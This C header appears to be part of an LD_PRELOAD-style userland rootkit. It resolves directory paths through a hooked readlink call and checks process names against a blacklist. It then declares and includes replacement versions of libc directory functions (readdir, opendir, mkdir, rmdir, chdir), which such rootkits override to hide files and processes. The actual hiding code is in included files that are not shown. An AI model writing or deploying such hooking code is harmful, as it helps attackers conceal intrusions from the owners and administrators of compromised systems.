#ifndef DIR_H
#define DIR_H

char *gdirname(DIR *dirp){
    int fd = dirfd(dirp);
    char path[PATH_MAX], *filename = (char *)malloc(PATH_MAX);
    memset(filename, 0, PATH_MAX);

    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    if((long)call(CREADLINK, path, filename, sizeof(path)) < 0) return NULL;
    return filename;
}

int is_blacklisted(const char *process){
    char *proc;
    int r = 0;

    for(int i = 0; i < PROCESS_BLACKLIST_SIZE; i++){
        proc = process_blacklist[i];
        if(!strncmp(proc, process, strlen(proc))){
            r = 1;
            break;
        }
    }

    return r;
}

int mkdir(const char *pathname, mode_t mode);
#include "mkdir.c"

int rmdir(const char *pathname);
#include "rmdir.c"

int chdir(const char *pathname);
int fchdir(int fd);
#include "chdir.c"

struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
#include "readdir.c"

DIR *opendir(const char *pathname);
DIR *opendir64(const char *pathname);
DIR *fdopendir(int fd);
#include "opendir.c"
#endif
